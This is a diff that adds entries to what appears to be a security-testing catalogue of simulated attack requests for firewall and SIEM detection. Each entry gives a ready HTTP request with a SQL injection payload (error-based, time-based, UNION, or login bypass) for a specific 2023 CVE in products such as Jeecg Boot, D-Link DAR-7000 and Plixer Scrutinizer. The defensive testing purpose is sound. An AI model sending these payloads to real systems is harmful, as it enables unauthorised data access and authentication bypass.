@@ -285545,6 +285545,190 @@
     "visible": true
   },
   {
+    "name": "CVE-2023-42405 - FIT2CLOUD RackShift SQL Injection",
+    "displayName": "CVE-2023-42405 - FIT2CLOUD RackShift SQL Injection",
+    "description": "FIT2CLOUD RackShift v1.7.1 is vulnerable to SQL injection via the `sort` parameter handled by taskService.list() (TaskController.list, POST task/list/{page}/{pageSize}). The sort value is concatenated into an `order by ${sort}` MyBatis clause without sanitization. The request sends the exact error/time-based UPDATEXML payload from the reporter's PoC in the JSON body `sort` field. No vendor WAF rule found; built from the project issue PoC and the TaskController source.\n\nReferences used to recreate this request:\n- https://github.com/fit2cloud/rackshift/issues/79 (PoC with sort payload)\n- https://github.com/fit2cloud/rackshift/blob/master/rackshift-server/src/main/java/io/rackshift/controller/TaskController.java (endpoint mapping)\n- https://www.cve.org/CVERecord?id=CVE-2023-42405 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /task/list/1/10 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\nAuthorization: dummy\n\n{\"searchKey\":\"1\",\"sort\":\"(UPDATEXML(2546,CONCAT(0x2e,0x717a6b7171,(SELECT (ELT(2546=2546,1))),0x7171787871),9622))\"}\n"
+    },
+    "cves": [
+      "CVE-2023-42405"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-42405",
+        "link": "https://github.com/fit2cloud/rackshift/issues/79"
+      },
+      {
+        "title": "source_endpoint for CVE-2023-42405",
+        "link": "https://github.com/fit2cloud/rackshift/blob/master/rackshift-server/src/main/java/io/rackshift/controller/TaskController.java"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-42268 - Jeecg Boot jmreport/show SQL Injection",
+    "displayName": "CVE-2023-42268 - Jeecg Boot jmreport/show SQL Injection",
+    "description": "Jeecg Boot (JimuReport) up to v3.5.3 is vulnerable to SQL injection via the JSON `id` parameter of the /jeecg-boot/jmreport/show component. The request sends the PoC payload with an updatexml()-based injection in `id` (plus the accompanying apiSelectId field) as application/json. No vendor WAF rule found; built from the published PoC and the CVE description.\n\nReferences used to recreate this request:\n- https://github.com/jeecgboot/jeecg-boot/issues/5311 (issue reference)\n- https://nvd.nist.gov/vuln/detail/CVE-2023-42268 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /jeecg-boot/jmreport/show HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\n\n{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}\n"
+    },
+    "cves": [
+      "CVE-2023-42268"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-42268",
+        "link": "https://github.com/jeecgboot/jeecg-boot/issues/5311"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-42359 - Exam Form Submission In PHP SQL Injection",
+    "displayName": "CVE-2023-42359 - Exam Form Submission In PHP SQL Injection",
+    "description": "Exam Form Submission in PHP with Source Code v1.0 is vulnerable to SQL injection via the val-username parameter in /index.php. The request sends an OR-based authentication-bypass SQLi payload in val-username. HTTP method inferred as POST (login/form submission action); no vendor WAF rule found; built from the CVE description and advisory write-up.\n\nReferences used to recreate this request:\n- https://upbeat-washer-def.notion.site/Exam-Form-Submission-In-PHP-SQL-Injection-in-index-php-bd71962db712459488019d531ab2f6f2 (advisory write-up)\n- https://nvd.nist.gov/vuln/detail/CVE-2023-42359 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nval-username=admin%27+OR+1%3D1--+-&val-password=dummy\n"
+    },
+    "cves": [
+      "CVE-2023-42359"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_writeup for CVE-2023-42359",
+        "link": "https://upbeat-washer-def.notion.site/Exam-Form-Submission-In-PHP-SQL-Injection-in-index-php-bd71962db712459488019d531ab2f6f2"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-42406 - D-Link DAR-7000 editrole.php SQL Injection",
+    "displayName": "CVE-2023-42406 - D-Link DAR-7000 editrole.php SQL Injection",
+    "description": "D-Link Online behavior audit gateway DAR-7000 V31R02B1413C is vulnerable to SQL injection via the id parameter (POST field hid_id) of the /sysmanage/editrole.php component. The request sends a time-based blind SQLi payload (nested SELECT with SLEEP) in hid_id. No vendor WAF rule found; built from the published PoC request.\n\nReferences used to recreate this request:\n- https://github.com/flyyue2001/cve/blob/main/D-LINK%20-DAR-7000_sql_:sysmanage:editrole.php.md (PoC request)\n- https://nvd.nist.gov/vuln/detail/CVE-2023-42406 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /sysmanage/editrole.php HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\nContent-Type: application/x-www-form-urlencoded\n\nhid_id=(select*from(select(sleep(5)))a)\n"
+    },
+    "cves": [
+      "CVE-2023-42406"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-42406",
+        "link": "https://github.com/flyyue2001/cve/blob/main/D-LINK%20-DAR-7000_sql_:sysmanage:editrole.php.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2023-41623 - Emlog Pro SQL Injection",
     "displayName": "CVE-2023-41623 - Emlog Pro SQL Injection",
     "description": "Emlog Pro 2.1.14 is vulnerable to SQL injection via the uid parameter of the admin media manager at /admin/media.php. The request sends a time-based blind SQL injection payload (AND SLEEP(5)) in the uid parameter. HTTP method is inferred as GET (uid is a record/listing filter parameter); this inference is flagged. No vendor WAF rule found; built from the NVD/VulDB entry-point description and the PoC repository.\n\nReferences used to recreate this request:\n- https://github.com/GhostBalladw/wuhaozhe-s-CVE/blob/main/CVE-2023-41623 (PoC, repository access blocked in this session)\n- https://nvd.nist.gov/vuln/detail/CVE-2023-41623 (CVE record / entry point: uid parameter at /admin/media.php)",
@@ -286168,6 +286352,463 @@
       {
         "title": "poc_github for CVE-2023-41522",
         "link": "https://gist.github.com/celbahraoui/f13884670ac6668ae05b60fd37bb3521"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41521 - Student Attendance Management System SQL Injection",
+    "displayName": "CVE-2023-41521 - Student Attendance Management System SQL Injection",
+    "description": "Student Attendance Management System v1 is vulnerable to SQL injection in the createSessionTerm.php endpoint via the id, termId and sessionName parameters. The request sends a boolean-based SQL injection payload in sessionName. HTTP method inferred as POST (record-creation form action); install folder not published, path used as named in the advisory. No vendor WAF rule found; built from the CVE/PoC entry point.\n\nReferences used to recreate this request:\n- https://gist.github.com/celbahraoui/4300aa8eb79e99f2c481cfb3a49a0cd9 (PoC gist)\n- https://github.com/rickxy/Student-Attendance-Management-System (affected product)\n- https://www.cve.org/CVERecord?id=CVE-2023-41521 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /createSessionTerm.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsessionName=x%27+OR+1%3D1--+-&termId=1&id=1\n"
+    },
+    "cves": [
+      "CVE-2023-41521"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41521",
+        "link": "https://gist.github.com/celbahraoui/4300aa8eb79e99f2c481cfb3a49a0cd9"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41520 - Student Attendance Management System SQL Injection",
+    "displayName": "CVE-2023-41520 - Student Attendance Management System SQL Injection",
+    "description": "Student Attendance Management System v1 is vulnerable to SQL injection in the createClassArms.php endpoint via the classId and classArmName parameters. The request sends a UNION SELECT payload in classArmName. HTTP method inferred as POST (record-creation form action); install folder not published, path used as named in the advisory. No vendor WAF rule found; built from the CVE/PoC entry point.\n\nReferences used to recreate this request:\n- https://gist.github.com/celbahraoui/39c19c0b7f9f92a1a7e06d1c928bb1c3 (PoC gist)\n- https://github.com/rickxy/Student-Attendance-Management-System (affected product)\n- https://www.cve.org/CVERecord?id=CVE-2023-41520 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /createClassArms.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nclassArmName=x%27+UNION+SELECT+1%2C2%2C3--+-&classId=1\n"
+    },
+    "cves": [
+      "CVE-2023-41520"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41520",
+        "link": "https://gist.github.com/celbahraoui/39c19c0b7f9f92a1a7e06d1c928bb1c3"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41443 - Novel-Plus SQL Injection",
+    "displayName": "CVE-2023-41443 - Novel-Plus SQL Injection",
+    "description": "Novel-Plus v4.1.0 is vulnerable to SQL injection via the sort parameter of the /sys/menu/list endpoint (MyBatis order-by injection). The request sends a time-based payload (SLEEP(5)) in sort. HTTP method inferred as GET (list endpoint). A dummy bearer token is included so the request shape matches the authenticated call; the WAF inspects before the app. No vendor WAF rule found; built from the PoC entry point.\n\nReferences used to recreate this request:\n- https://github.com/Deng-JunFeng/cve-lists/tree/main/novel-plus/vuln (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2023-41443 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /sys/menu/list?page=1&limit=10&sort=1%2C(SELECT+SLEEP(5)) HTTP/1.1\nHost: {{target_host}}\nAuthorization: Bearer dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-41443"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41443",
+        "link": "https://github.com/Deng-JunFeng/cve-lists/tree/main/novel-plus/vuln"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41364 - tine groupware SQL Injection",
+    "displayName": "CVE-2023-41364 - tine groupware SQL Injection",
+    "description": "tine through 2023.01.14.325 is vulnerable to SQL injection via the sort parameter of the /index.php endpoint. The request sends a time-based payload (AND SLEEP(5)) in sort. HTTP method inferred as GET. No vendor WAF rule found; built from the usd HeroLab advisory entry point.\n\nReferences used to recreate this request:\n- https://herolab.usd.de/security-advisories/usd-2023-0002/ (advisory)\n- https://www.cve.org/CVERecord?id=CVE-2023-41364 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /index.php?sort=1+AND+SLEEP(5) HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-41364"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_advisory for CVE-2023-41364",
+        "link": "https://herolab.usd.de/security-advisories/usd-2023-0002/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41262 - Plixer Scrutinizer SQL Injection",
+    "displayName": "CVE-2023-41262 - Plixer Scrutinizer SQL Injection",
+    "description": "Plixer Scrutinizer before 19.3.1 is vulnerable to unauthenticated SQL injection in /fcgi/scrut_fcgi.fcgi: the csvExportReport endpoint action generateCSV is injectable through the sorting parameter. The request sends a time-based payload (AND SLEEP(5)) in sorting. HTTP method inferred as GET (query-string action). No vendor WAF rule found; built from the Atredis Partners advisory entry point.\n\nReferences used to recreate this request:\n- https://github.com/atredispartners/advisories/blob/master/ATREDIS-2023-0001.md (advisory / PoC)\n- https://www.cve.org/CVERecord?id=CVE-2023-41262 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /fcgi/scrut_fcgi.fcgi?action=generateCSV&sorting=1+AND+SLEEP(5) HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2023-41262"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41262",
+        "link": "https://github.com/atredispartners/advisories/blob/master/ATREDIS-2023-0001.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41015 - code-projects Online Job Portal SQL Injection",
+    "displayName": "CVE-2023-41015 - code-projects Online Job Portal SQL Injection",
+    "description": "code-projects.org Online Job Portal 1.0 is vulnerable to SQL injection via the JobId parameter of /Employer/DeleteJob.php. The request sends a boolean-based SQL injection payload in JobId. HTTP method GET (as given in the advisory URL). No vendor WAF rule found; built from the PoC entry point.\n\nReferences used to recreate this request:\n- https://github.com/ASR511-OO7/CVE-2023-41015/blob/main/CVE-27 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2023-41015 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /Employer/DeleteJob.php?JobId=1%27+OR+1%3D1--+- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-41015"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41015",
+        "link": "https://github.com/ASR511-OO7/CVE-2023-41015/blob/main/CVE-27"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-41014 - code-projects Online Job Portal SQL Injection",
+    "displayName": "CVE-2023-41014 - code-projects Online Job Portal SQL Injection",
+    "description": "code-projects.org Online Job Portal 1.0 is vulnerable to SQL injection via the Username parameter of the Employer login. The request sends a boolean-based SQL injection (authentication bypass) payload in Username. HTTP method inferred as POST (login form); login-handler path inferred as /Employer/index.php (the /Employer/ install folder is confirmed by CVE-2023-41015). No vendor WAF rule found; built from the PoC entry point.\n\nReferences used to recreate this request:\n- https://github.com/ASR511-OO7/CVE-2023-41014/blob/main/CVE-28 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2023-41014 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /Employer/index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nUsername=admin%27+OR+1%3D1--+-&password=x&login=\n"
+    },
+    "cves": [
+      "CVE-2023-41014"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-41014",
+        "link": "https://github.com/ASR511-OO7/CVE-2023-41014/blob/main/CVE-28"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-40992 - kishan0725 Hospital Management System SQL Injection",
+    "displayName": "CVE-2023-40992 - kishan0725 Hospital Management System SQL Injection",
+    "description": "Hospital Management System 4 is vulnerable to SQL injection in /Hospital-Management-System-master/func.php via the password2 parameter. The request sends a boolean-based SQL injection payload (' OR 1=1-- -) in the password2 form field, matching OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the CVE/VulDB entry point. HTTP method inferred as POST (func.php is a form-handler endpoint) and flagged because the PoC on GitHub/gist was permission-blocked in this session.\n\nReferences used to recreate this request:\n- https://github.com/kishan0725/Hospital-Management-System (vulnerable product repo; PoC blocked in session)\n- https://gist.github.com/celbahraoui/606fc8159738c06c41ece15182a6934f (PoC gist; blocked in session)\n- https://www.cve.org/CVERecord?id=CVE-2023-40992 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /Hospital-Management-System-master/func.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\npassword2=%27%20OR%201%3D1--%20-\n"
+    },
+    "cves": [
+      "CVE-2023-40992"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-40992",
+        "link": "https://github.com/kishan0725/Hospital-Management-System"
+      },
+      {
+        "title": "poc_gist for CVE-2023-40992",
+        "link": "https://gist.github.com/celbahraoui/606fc8159738c06c41ece15182a6934f"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-40989 - JeecgBoot JimuReport queryFieldBySql SQL Injection",
+    "displayName": "CVE-2023-40989 - JeecgBoot JimuReport queryFieldBySql SQL Injection",
+    "description": "JeecgBoot (jeecg-boot v3.0-3.5.3, jimureport-spring-boot-starter <=1.6.0) is vulnerable to SQL injection via the JimuReport jmreport/queryFieldBySql endpoint, which executes attacker-supplied SQL from the JSON body 'sql' field. The request sends a UNION SELECT payload in the sql field, matching OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the CVE description and the documented JimuReport queryFieldBySql endpoint. Method known to be POST with a JSON body.\n\nReferences used to recreate this request:\n- https://github.com/Zone1-Z/CVE-2023-40989/blob/main/CVE-2023-40989 (PoC; blocked in session)\n- https://research.averlon.ai/vulnerability-intelligence/cve/CVE-2023-40989 (advisory, confirms report/jmreport/queryFieldBySql component)\n- https://www.cve.org/CVERecord?id=CVE-2023-40989 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json;charset=UTF-8\n\n{\"sql\":\"select * from sys_user where 1=1 union select 1,2,3,4,5,6,7,8,9,10\"}\n"
+    },
+    "cves": [
+      "CVE-2023-40989"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-40989",
+        "link": "https://github.com/Zone1-Z/CVE-2023-40989/blob/main/CVE-2023-40989"
+      },
+      {
+        "title": "advisory for CVE-2023-40989",
+        "link": "https://research.averlon.ai/vulnerability-intelligence/cve/CVE-2023-40989"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2023-40945 - SourceCodester Doctor Appointment System SQL Injection",
+    "displayName": "CVE-2023-40945 - SourceCodester Doctor Appointment System SQL Injection",
+    "description": "SourceCodester Doctor Appointment System 1.0 is vulnerable to SQL injection via the userid value used in doctors/myDetails.php. The request sends a UNION SELECT payload in the userid parameter, matching OWASP CRS 942 SQLi signatures. No vendor WAF rule found; built from the CVE/VulDB entry point. HTTP method inferred as GET (userid is a record-selector parameter) and flagged because the PoC on GitHub was permission-blocked in this session.\n\nReferences used to recreate this request:\n- https://github.com/KLSEHB/vulnerability-report/blob/main/Doctormms_CVE-2023-40945 (PoC; blocked in session)\n- https://www.cve.org/CVERecord?id=CVE-2023-40945 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /doctors/myDetails.php?userid=-1%20UNION%20SELECT%201,2,3,4,5,6--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2023-40945"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2023-40945",
+        "link": "https://github.com/KLSEHB/vulnerability-report/blob/main/Doctormms_CVE-2023-40945"
       }
     ],
     "public": false,
